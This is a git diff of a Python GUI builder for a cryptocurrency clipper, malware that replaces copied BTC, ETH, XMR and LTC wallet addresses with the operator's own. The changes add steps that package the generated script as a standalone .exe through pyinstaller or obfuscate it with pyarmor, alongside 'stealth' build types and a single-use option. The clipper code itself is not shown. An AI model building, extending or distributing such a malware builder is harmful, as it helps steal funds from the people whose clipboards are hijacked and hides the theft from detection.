@@ -5,9 +5,11 @@ import subprocess
 import webbrowser
 import CTkToolTip
 import shutil
+import time
 import hPyT
 import re
 import os
+
 #needs pyarmor for obfuscator - pyarmor gen main.py
 
 btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
@@ -21,7 +23,7 @@ cwd = os.getcwd()
 
 class resetconfig:
     def reset(btc_addr, eth_addr, xmr_addr, ltc_addr):
-        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
+        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", state="normal", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
         config_set_lbl.configure(text="config not set", text_color="red")
         check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr))
         exe_file_checkbox.deselect()
@@ -31,12 +33,28 @@ class resetconfig:
         buildclipperconfig.class_called = 0
 
 class build:
-    def send_to_exe():
-        pass
+    def exe(current_path, new_file_name):
+        start = time.time()
+        subprocess.run(["pyinstaller", "--onefile", f"{current_path}", "--distpath", "output/dist_non_obfuscated"])
+        end = time.time()
+        final_time = round(end - start)
+        if os.path.exists("output\\dist_non_obfuscated"):
+            shutil.rmtree("build")
+            rm_file_path = str(new_file_name).replace(".pyw", ".spec")
+            os.remove(rm_file_path)
+            CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_non_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
 
     def obfuscate(current_path, new_file_name):
-        subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist", "--pack=onefile"])
-        os.remove(current_path)
+        start = time.time()
+        subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist_obfuscated", "--pack=onefile"])
+        end = time.time()
+        final_time = round(end - start)
+        if os.path.exists("output\\dist_obfuscated"):
+            shutil.rmtree(".pyarmor")
+            shutil.rmtree("dist")
+            rm_file_path = str(new_file_name).replace(".pyw", ".spec")
+            os.remove(rm_file_path)
+            CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
 
     def build_all(single_use, obfuscate, exe_file):
         print("build_all")
@@ -89,13 +107,14 @@ class build:
             else:
                 new_file_name = out_name.get().strip()
                 with open(os.path.join("output", new_file_name), "w") as new_file:
-                    new_file.write(script_content)
+                    new_file.write(script_content)       
         
         if obfuscate == "on":
             current_path = os.path.join("output", new_file_name)
             build.obfuscate(current_path, new_file_name)
-        else:
-            pass
+        if exe_file == "on":
+            current_path = os.path.join("output", new_file_name)
+            build.exe(current_path, new_file_name)
 
         os.remove("scripts/temp.pyw")
 
@@ -106,7 +125,9 @@ class build:
         print("build_pyperclip")
 
     def check_type():
-        check_valid_btn.configure(state="disabled", text="building...")
+        check_valid_btn.configure(text="to run again set a new config with reset config", state="disabled")
+        time.sleep(1)
+
         if type == "subprocess (0 external modules - stealth)":
             build.build_subprocess(single_use, obfuscate, exe_file)
         if type == "ctypes (0 external modules - stealth)":
@@ -130,6 +151,8 @@ class buildclipperconfig:
 
         if obfuscate == "on" and exe_file == "on":
             CTkMessagebox(title="error", message="both normal .exe and obfuscate .exe cannot be on", icon="cancel")
+        elif obfuscate == "off" and exe_file == "off":
+            CTkMessagebox(title="error", message="please pick a filetype (.exe, .exe obfuscated)", icon="cancel")
         else:
             if type == "set clipper type":
                 CTkMessagebox(title="error", message="please pick a valid clipper type", icon="cancel")
